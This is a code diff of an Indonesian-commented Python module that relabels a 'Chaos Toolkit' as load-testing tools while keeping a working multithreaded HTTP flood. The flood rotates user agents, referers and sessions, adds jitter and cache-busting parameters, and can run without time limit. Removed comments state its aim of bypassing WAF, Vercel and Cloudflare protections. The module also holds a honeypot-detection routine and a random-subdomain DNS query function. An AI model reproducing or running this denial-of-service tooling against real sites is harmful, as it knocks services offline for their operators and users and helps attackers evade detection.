@@ -4,12 +4,13 @@ import threading
 import time
 import requests
 import secrets
+from typing import Dict, List
 
-# * Modul Chaos Toolkit (Zaqi Nitro Boost Edition)
+# * Modul Peralatan Keamanan Lanjutan
 class SpecialTools:
     def __init__(self):
         self.isFlooding = False
-        self.user_agents = [
+        self.user_agents: List[str] = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
@@ -20,15 +21,22 @@ class SpecialTools:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
         ]
-        self.referers = [
+        self.referers: List[str] = [
             "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
             "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/",
             "https://t.co/", "https://github.com/", "https://stackoverflow.com/"
         ]
-        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
+        self.stats: Dict[str, int] = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
 
-    # * Deteksi HoneyPot (Advanced Delay Measurement)
-    def detectHoneypot(self, target):
+    def detectHoneypot(self, target: str) -> bool:
+        """Deteksi HoneyPot melalui pengukuran respons penundaan soket.
+        
+        Args:
+            target: Alamat peladen IP/Domain sasaran.
+            
+        Returns:
+            True jika terindikasi Honeypot berdasarkan respon yang lambat tak wajar.
+        """
         start = time.time()
         try:
             socket.create_connection((target, 80), timeout=2)
@@ -37,31 +45,39 @@ class SpecialTools:
         except Exception:
             return False
 
-    # * Nitro Stress Engine (Porting from Destroyer/Agile Profile)
-    def runNitroStress(self, targetUrl, duration=15, threads=50):
+    def runHttpFlood(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
+        """Menjalankan modul asinkron pengujian beban (HTTP Flood) pada aplikasi web dengan rotasi identitas.
+        
+        Args:
+            targetUrl: URL lengkap web yang diuji.
+            duration: Durasi waktu detik. 0 menandakan konstan tidak terbatas.
+            threads: Paralel pekerja utas jaringan.
+            
+        Returns:
+            String konfirmasi inisialisasi uji beban respon server.
+        """
         self.isFlooding = True
         self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
-        print(f"[*] Starting NITRO STRESS on {targetUrl} with {threads} threads.")
+        print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")
         
         def attack_worker():
-            # * Unlimited duration if set to 0
+            # * Batas waktu tidak terhingga jika nilai dimasukkan 0
             timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
             session = requests.Session()
             request_count = 0
             
             while time.time() < timeout and self.isFlooding:
-                if hasattr(self, 'core') and self.core and self.core.stop_requested:
+                if hasattr(self, 'core') and self.core and getattr(self.core, 'stop_requested', False):
                     break
                 
-                # * Session Rotation v5.8.16 (Bypass Sticky WAF)
+                # Rotasi penahanan peramban menghindar limitasi soket 
                 request_count += 1
                 if request_count % 500 == 0:
                     session.close()
                     session = requests.Session()
 
                 try:
-                    # -- NITRO BOOST OPTIMIZATION v5.8.15 --
-                    # Jitter & Stealth Logic (Bypass WAF/Vercel)
+                    # Logika Jitter Stealth
                     time.sleep(random.uniform(0.01, 0.05))
                     
                     random_str = secrets.token_hex(4)
@@ -89,9 +105,8 @@ class SpecialTools:
                         'Referer': random.choice(self.referers)
                     }
                     
-                    # Target Profile logic (Bypass Vercel/Cloudflare basics)
                     connector = '&' if '?' in targetUrl else '?'
-                    test_url = f"{targetUrl}{connector}nitro={random_str}"
+                    test_url = f"{targetUrl}{connector}bypass_cache={random_str}"
                     
                     resp = session.get(test_url, headers=headers, timeout=5, allow_redirects=True)
                     
@@ -105,25 +120,31 @@ class SpecialTools:
                     self.stats["error"] += 1
             session.close()
 
-        # Launch Threads
         workers = []
         for _ in range(threads):
             t = threading.Thread(target=attack_worker, daemon=True)
             t.start()
             workers.append(t)
             
-        return f"Nitro Stress initiated (Profile: Destroyer) for {duration} seconds."
+        return f"Pengujian beban asinkron HTTP Flood dijalankan {duration} detik."
 
-    # * Stop all active stress tests
-    def stopChaos(self):
+    def stopActiveTasks(self) -> str:
+        """Hentikan paksa seluruh lalu lintas uji beban."""
         self.isFlooding = False
-        return "Chaos activities stopped."
+        return "Penghentian pengerjaan beban berhasil disebarkan ke pekerja utas."
 
-    # * DNS Stress Test (Safe mining)
-    def dnsStressTest(self, target):
+    def dnsStressTest(self, target: str) -> str:
+        """Menjalankan pengujian resolusi DNS acak.
+        
+        Args:
+            target: Sistem pemetaan rute target.
+            
+        Returns:
+            String log sukses / gagal.
+        """
         try:
             for i in range(5):
-                socket.gethostbyname(f"zaqidev{random.randint(1,999)}.{target}")
-            return "DNS Queries sent (Nitro Mode)."
+                socket.gethostbyname(f"v-domain-{random.randint(1,999)}.{target}")
+            return "Pencarian jejak asinkron rute sub-DNS dirampungkan."
         except Exception as e:
             return f"DNS Error: {str(e)}"
